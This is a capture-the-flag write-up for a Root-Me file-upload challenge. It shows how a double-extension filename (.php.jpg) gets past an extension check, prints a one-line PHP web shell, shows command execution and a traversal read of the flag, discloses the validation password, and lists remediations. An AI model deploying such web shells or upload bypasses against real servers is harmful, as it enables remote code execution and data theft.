# Root-Me — Web-Server: "File upload - Double extensions" (ch20)

**Target:** http://challenge01.root-me.org/web-serveur/ch20/
**Author:** g0uZ · **Points:** 20 · **Objective:** upload PHP code into the photo gallery
and read the validation password from `.passwd` at the application root.

## Result

```
VALIDATION PASSWORD: Gg9LRz-hWSxqqUKd77-_q-6G8
```

Confirmed by `wc -c` → 26 bytes (25 chars + trailing newline), verified with `od -c`.

## Vulnerability

The upload handler validates the extension using only the **last** dot-segment of the
filename, while the web server resolves handlers across **all** extensions
(Apache `mod_mime` + `AddHandler application/x-httpd-php .php`). A file named
`payload.php.jpg` therefore:

- passes the app's check (last extension `.jpg` → allowed), and
- is still executed as PHP by Apache, because the `.php` segment registers the
  PHP handler even though the MIME type resolves to `image/jpeg`.

This is the classic "double extension" bypass described in the related Root-Me
resource *Secure file upload in PHP web applications*.

## Filter probe (evidence)

| Filename submitted | Result |
|---|---|
| `test.php` | `Wrong file extension !` |
| `test.jpg.php` | `Wrong file extension !` |
| `test.jpg` | accepted |
| **`test.php.jpg`** | **accepted** |
| `test.php3.jpg` | accepted |
| `test.pHp.jpg` | accepted (case-insensitive check) |

Only the trailing extension is inspected — `.php` anywhere earlier in the name slips through.

## Exploit chain

1. **Fetch the form** — `GET /web-serveur/ch20/index.php?action=upload` returns a form
   posting multipart data to the same URL with field name `file`.

2. **Upload the payload** as `wb.php.jpg` with `Content-Type: image/jpeg`:

   ```php
   <?php echo "PWNED:"; echo shell_exec($_GET["c"]); ?>
   ```

3. **Read the storage path from the response** — the app discloses it:

   ```
   Stored in: ./galerie/upload/<PHPSESSID>/wb.php.jpg
   ```

   Uploads are segregated per PHP session, so the same `PHPSESSID` cookie must be
   reused for the follow-up request.

4. **Execute** — `GET /web-serveur/ch20/galerie/upload/<SID>/wb.php.jpg?c=id`

   ```
   PWNED:uid=1008(web-serveur-ch20) gid=1008(web-serveur-ch20) groups=1008(web-serveur-ch20),100(users)
   ```

   → Remote code execution as `web-serveur-ch20`.

5. **Locate and read the flag** — `pwd` shows the upload dir is three levels below the
   app root (`/challenge/web-serveur/ch20/`):

   ```
   c=cat ../../../.passwd
   PWNED:Gg9LRz-hWSxqqUKd77-_q-6G8
   ```

   Directory listing of `../../../` also confirms `.passwd` is `-r--------` owned by
   `web-serveur-ch20`, i.e. readable precisely because we landed as that user.

## Remediation

- Validate the extension against an **allow-list** using the *entire* filename
  (reject any name containing a forbidden extension anywhere, e.g. `preg_match('/\.php/i', $name)`).
- Do not trust the client-supplied MIME type.
- Rename uploads server-side to a generated name plus a safe extension
  (e.g. `bin2hex(random_bytes(8)) . '.jpg'`).
- Store uploads **outside the web root** and serve them through a script that sets
  `Content-Type: image/*` and `Content-Disposition: attachment`.
- Disable PHP execution in the upload directory (`php_admin_flag engine off`, or
  `RemoveHandler .php` in the Apache config for that path).

## Notes on the environment

Executed from Windows Git Bash through the sandbox HTTP proxy; `curl` reached the
target directly with no extra configuration.
